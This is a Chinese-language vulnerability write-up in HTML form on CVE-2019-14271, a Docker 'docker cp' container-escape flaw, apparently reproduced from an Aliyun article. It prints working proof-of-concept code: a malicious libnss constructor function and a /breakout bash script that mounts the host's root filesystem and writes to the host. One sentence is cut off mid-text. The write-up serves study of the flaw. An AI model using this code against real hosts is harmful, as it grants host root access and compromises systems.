<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="cve-2019-14271docker-copy漏洞"><span class="csECDA2D3">（</span><span class="csDE05BCC">CVE-2019-14271</span><span class="csECDA2D3">）</span><span class="csDE05BCC">Docker copy</span><span class="csECDA2D3">漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Docker 19.03.1</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="docker-cp"><span class="csD1E291E2">Docker cp</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs8926E06">Copy</span><span class="cs9C1B1871">命令允许从容器、向容器中、或容器之间复制文件。语法与标准的</span><span class="cs8926E06">unix cp</span><span class="cs9C1B1871">命令非常相似。要从容器中复制</span><span class="cs8926E06">/var/logs</span><span class="cs9C1B1871">，语法是</span><span class="cs8926E06">docker cp container_name:/var/logs /some/host/path</span><span class="cs9C1B1871">。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">从下图所示，要从容器中将文件复制出去，</span><span class="cs8926E06">Docker</span><span class="cs9C1B1871">使用了一个名为</span><span class="cs8926E06">docker-tar</span><span class="cs9C1B1871">的帮助进程。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Docker/%ef%bc%88CVE-2019-14271%ef%bc%89Docker%20copy%e6%bc%8f%e6%b4%9e_files/image0.png" width="560" height="71" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">图</span><span class="cs8926E06"> 1. </span><span class="cs9C1B1871">从容器中复制文件</span></p><p class="cs40DD2BC9"><span class="cs8926E06">docker-tar</span><span class="cs9C1B1871">是通过</span><span class="cs8926E06">chroot</span><span class="cs9C1B1871">到容器，将请求的文件或目录存档，然后将生成的</span><span class="cs8926E06">tar</span><span class="cs9C1B1871">文件传递给</span><span class="cs8926E06">Docker daemon</span><span class="cs9C1B1871">，然后由</span><span class="cs8926E06">daemon</span><span class="cs9C1B1871">提取到主机的目标目录中。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">注释：</span><span class="cs8926E06">CHROOT</span><span class="cs9C1B1871">就是</span><span class="cs8926E06">Change Root</span><span class="cs9C1B1871">，也就是改变程序执行时所参考的根目录位置。</span><span class="cs8926E06">CHROOT</span><span class="cs9C1B1871">可以增进系统的安全性，限制使用者能做的事。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Docker/%ef%bc%88CVE-2019-14271%ef%bc%89Docker%20copy%e6%bc%8f%e6%b4%9e_files/image1.png" width="560" height="55" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">图</span><span class="cs8926E06"> 2. docker-tar chroot</span><span class="cs9C1B1871">到容器中</span></p><p class="cs40DD2BC9"><span class="cs8926E06">Chroot</span><span class="cs9C1B1871">主要是为了避免系统链接的问题，当主机进程尝试访问容器中的文件时就可能会引发系统链接问题。如果访问的文件中有系统链接，就会解析到</span><span class="cs8926E06">host root</span><span class="cs9C1B1871">。因此，攻击者控制的容器就可以尝试和诱使</span><span class="cs8926E06">docker cp</span><span class="cs9C1B1871">在主机而非容器上读写文件。去年有许多</span><span class="cs8926E06">Docker</span><span class="cs9C1B1871">和</span><span class="cs8926E06">Podman</span><span class="cs9C1B1871">相关的系统链接</span><span class="cs8926E06">CVE</span><span class="cs9C1B1871">漏洞。通过</span><span class="cs8926E06">chroot</span><span class="cs9C1B1871">到容器的</span><span class="cs8926E06">root</span><span class="cs9C1B1871">，</span><span class="cs8926E06">docker-tar</span><span class="cs9C1B1871">可以确保所有系统链接都可以高效地解析。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">但，</span><span class="cs8926E06">chroot</span><span class="cs9C1B1871">到容器然后从容器中复制文件可能会引发很严重的安全问题。</span></p><h3 class="cs868C439D">
			<a name="cve-2019-14271"><span class="csD1E291E2">CVE-2019-14271</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs8926E06">Docker</span><span class="cs9C1B1871">是用</span><span class="cs8926E06">Golang</span><span class="cs9C1B1871">语言编写。有漏洞的</span><span class="cs8926E06">Docker</span><span class="cs9C1B1871">版本是用</span><span class="cs8926E06">Go v1.11</span><span class="cs9C1B1871">编译的。在该版本中，一些含有嵌入</span><span class="cs8926E06">C</span><span class="cs9C1B1871">代码（</span><span class="cs8926E06">cgo</span><span class="cs9C1B1871">）的包会在运行时动态加载共享的库。这些包包括</span><span class="cs8926E06">net</span><span class="cs9C1B1871">和</span><span class="cs8926E06">os/user</span><span class="cs9C1B1871">，都是</span><span class="cs8926E06">docker-tar</span><span class="cs9C1B1871">使用的，而且在运行时会加载多个</span><span class="cs8926E06">libnss_*.so</span><span class="cs9C1B1871">库。一般来说，库是从</span><span class="cs8926E06">host</span><span class="cs9C1B1871">文件系统加载的，但因为</span><span class="cs8926E06">docker-tarchroot</span><span class="cs9C1B1871">到了容器，因此会从容器文件系统中加载库。也就是说</span><span class="cs8926E06">docker-tat</span><span class="cs9C1B1871">会加载和执行来源于容器或由容器控制的代码。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">需要说明的是，除了</span><span class="cs8926E06">chroot</span><span class="cs9C1B1871">到容器文件系统外，</span><span class="cs8926E06">docker-tar</span><span class="cs9C1B1871">并没有被容器化。它是在</span><span class="cs8926E06">host</span><span class="cs9C1B1871">命名空间运行的，权限为</span><span class="cs8926E06">root</span><span class="cs9C1B1871">全新且不受限于</span><span class="cs8926E06">cgroups</span><span class="cs9C1B1871">或</span><span class="cs8926E06">seccomp</span><span class="cs9C1B1871">。因此，通过注入代码到</span><span class="cs8926E06">docker-tar</span><span class="cs9C1B1871">，恶意容器就可以获取</span><span class="cs8926E06">host</span><span class="cs9C1B1871">主机的完全</span><span class="cs8926E06">root</span><span class="cs9C1B1871">访问权限。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">可能的攻击场景有</span><span class="cs8926E06">Docker</span><span class="cs9C1B1871">用户从另一个</span><span class="cs8926E06">Docker</span><span class="cs9C1B1871">处复制文件：</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">容器运行含有恶意</span><span class="cs8926E06">libnss_*.so</span><span class="cs9C1B1871">库的镜像</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">容器中含有被攻击者替换的</span><span class="cs8926E06">libnss_*.so</span><span class="cs9C1B1871">库</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在这两种情况下，攻击者都可以获取主机上的</span><span class="cs8926E06">root</span><span class="cs9C1B1871">代码执行权限。</span></p><h3 class="cs868C439D">
			<a name="漏洞利用"><span class="csD6CA00D2">漏洞利用</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">为利用该漏洞，研究人员需要先创建一个恶意</span><span class="cs8926E06">libnss</span><span class="cs9C1B1871">库。研究人员随意选择了</span><span class="cs8926E06">libnss_files.so</span><span class="cs9C1B1871">文件，下载了库函数的源码，并在代码中加入了一个函数</span><span class="cs8926E06">&mdash;&mdash;run_at_link()</span><span class="cs9C1B1871">。研究人员还为该函数定义了</span><span class="cs8926E06">constructor</span><span class="cs9C1B1871">属性。</span><span class="cs8926E06">constructor</span><span class="cs9C1B1871">属性表明</span><span class="cs8926E06">run_at_link</span><span class="cs9C1B1871">函数在进程加载时会作为库的初始化函数执行。也就是说，当</span><span class="cs8926E06">Docker-tar</span><span class="cs9C1B1871">进程动态加载恶意库时，</span><span class="cs8926E06">run_at_link</span><span class="cs9C1B1871">函数就会执行。下面是</span><span class="cs8926E06">run_at_link</span><span class="cs9C1B1871">的代码：</span></p><p class="cs3A447A38"><span class="cs9FB05234">#include ...</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">#define ORIGINAL_LIBNSS &quot;/original_libnss_files.so.2&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#define LIBNSS_PATH &quot;/lib/x86_64-linux-gnu/libnss_files.so.2&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">bool is_priviliged();</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">__attribute__ ((constructor)) void run_at_link(void)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;char * argv_break[2];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;if (!is_priviliged())</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;rename(ORIGINAL_LIBNSS, LIBNSS_PATH);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;fprintf(log_fp, &quot;switched back to the original libnss_file.so&quot;);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;if (!fork())</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// Child runs breakout</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;argv_break[0] = strdup(&quot;/breakout&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;argv_break[1] = NULL;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;execve(&quot;/breakout&quot;, argv_break, NULL);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;else</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;wait(NULL); // Wait for child</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;return;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">bool is_priviliged()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;FILE * proc_file = fopen(&quot;/proc/self/exe&quot;, &quot;r&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;if (proc_file != NULL)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fclose(proc_file);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return false; // can open so /proc exists, not privileged</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;return true; // we&#39;re running in the context of docker-tar</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">查</span><span class="cs8926E06">/proc</span><span class="cs9C1B1871">目录完成的。如果</span><span class="cs8926E06">run_at_link</span><span class="cs9C1B1871">运行在</span><span class="cs8926E06">docker-tar</span><span class="cs9C1B1871">环境下，那么目录就是空的，因为</span><span class="cs8926E06">procfs</span><span class="cs9C1B1871">挂载在</span><span class="cs8926E06">/proc</span><span class="cs9C1B1871">上只存在于容器的</span><span class="cs8926E06">mount</span><span class="cs9C1B1871">命名空间。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">然后，</span><span class="cs8926E06">run_at_link</span><span class="cs9C1B1871">会用恶意</span><span class="cs8926E06">libnss</span><span class="cs9C1B1871">库替换原始库。这保证了漏洞利用运行的随后进程不会意外加载恶意版本，并触发</span><span class="cs8926E06">run_at_link</span><span class="cs9C1B1871">执行。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">为简化该漏洞利用，</span><span class="cs8926E06">run_at_link</span><span class="cs9C1B1871">会尝试在容器的</span><span class="cs8926E06">/breakout</span><span class="cs9C1B1871">路径下运行可执行文件。这样漏洞利用的其他部分就可以用</span><span class="cs8926E06">bash</span><span class="cs9C1B1871">写入，而非</span><span class="cs8926E06">C</span><span class="cs9C1B1871">语言。让逻辑的其他部分在</span><span class="cs8926E06">run_at_link</span><span class="cs9C1B1871">外，意味着在漏洞利用每次变化后无需重新编译恶意库，只需改变</span><span class="cs8926E06">breakout</span><span class="cs9C1B1871">二进制文件就可以了。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Docker/%ef%bc%88CVE-2019-14271%ef%bc%89Docker%20copy%e6%bc%8f%e6%b4%9e_files/image2.png" width="560" height="259" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">利用</span><span class="cs8926E06">CVE-2019-14271</span><span class="cs9C1B1871">打破</span><span class="cs8926E06">Docker</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在该漏洞视频中，</span><span class="cs8926E06">Docker</span><span class="cs9C1B1871">用户会运行含有恶意</span><span class="cs8926E06">libnss_files.so</span><span class="cs9C1B1871">的恶意镜像，然后尝试从容器中复制一些日志。镜像中的</span><span class="cs8926E06">/breakout</span><span class="cs9C1B1871">二进制文件是一个简单的</span><span class="cs8926E06">bash</span><span class="cs9C1B1871">脚步，会挂载</span><span class="cs8926E06">host</span><span class="cs9C1B1871">文件系统到</span><span class="cs8926E06">/host_fs</span><span class="cs9C1B1871">的容器中，并将消息写入</span><span class="cs8926E06">host</span><span class="cs9C1B1871">的</span><span class="cs8926E06">/evil</span><span class="cs9C1B1871">目录。</span><span class="cs8926E06"><br/>/breakout</span><span class="cs9C1B1871">脚本代码如下：</span></p><p class="cs3A447A38"><span class="cs9FB05234">umount /host_fs &amp;&amp; rm -rf /host_fs</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">mkdir /host_fs</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">mount -t proc none /proc &nbsp;&nbsp;&nbsp;&nbsp;# mount the host&#39;s procfs over /proc</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">cd /proc/1/root &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# chdir to host&#39;s root</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">mount --bind . /host_fs &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# mount host root at /host_fs</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">echo &quot;Hello from within the container!&quot; &gt; /host_fs/evil</span></p><h2 class="cs868C439D">
			<a name="四参考链接"><span class="cs83F14626">四、参考链接</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06">https://xz.aliyun.com/t/6806</span></p></body>
</html>
